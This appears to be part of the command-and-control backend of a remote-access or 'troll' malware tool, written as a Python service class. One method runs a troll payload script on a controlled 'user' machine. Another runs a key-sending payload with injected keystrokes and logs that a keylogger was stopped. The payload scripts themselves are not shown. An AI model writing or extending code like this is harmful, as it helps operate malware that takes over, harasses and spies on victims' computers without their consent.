from dataManager.repository.userRepository import UserRepository
import logging
import asyncio
from fastapi import HTTPException

class TrollService:
    def __init__(self, user_repository: UserRepository):
        self.user_repository = user_repository

    async def piano(self, user_id):
        user = self.user_repository.get_user(user_id)
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        await user.execute("./modules/payloads/payload_troll.py")
        logging.info("executed")
        return {
            "success": "Piano-mode started"
        }
    
    async def stop_piano(self, user_id):
        user = self.user_repository.get_user(user_id)
        r = await user.execute("./modules/payloads/payload_send_keys.py", {
            b"TO_REPLACE_WITH_KEYS": b"stoptrollingmepls",
            b"TO_REPLACE_WITH_SPECIAL_KEYS": b"None"
        })
        logging.info(f"Stopped keylogger on {user_id}. Response: {r}")
        return {"message": "Keylogger stopped"}
